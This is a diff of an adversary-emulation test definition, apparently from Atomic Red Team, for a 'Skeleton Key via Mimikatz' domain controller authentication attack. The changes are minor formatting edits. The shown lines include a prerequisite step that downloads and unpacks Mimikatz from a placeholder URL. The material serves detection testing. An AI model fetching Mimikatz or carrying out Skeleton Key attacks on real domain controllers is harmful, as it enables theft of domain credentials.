@@ -1,5 +1,5 @@
 attack_technique: T1556.001
-display_name: 'Modify Authentication Process: Domain Controller Authentication'
+display_name: "Modify Authentication Process: Domain Controller Authentication"
 atomic_tests:
 - name: Skeleton Key via Mimikatz
   auto_generated_guid: 0ee8081f-e9a7-4a2e-a23f-68473023184f
@@ -35,7 +35,7 @@ atomic_tests:
         if (Test-Path "#{mimikatz_path}") {exit 0} else {exit 1}
       get_prereq_command: |
         New-Item -Type Directory "#{directory_path}" -ErrorAction Ignore -Force | Out-Null
-        Invoke-WebRequest -Uri "#{mimikatz_url}" -OutFile "#{file_path}"
+        Invoke-WebRequest -Uri "#{mimikatz_url}" -OutFile "#{file_path}" -UseBasicParsing
         Expand-Archive -LiteralPath "#{file_path}" -DestinationPath "#{directory_path}" -Force
   executor:
     command: |
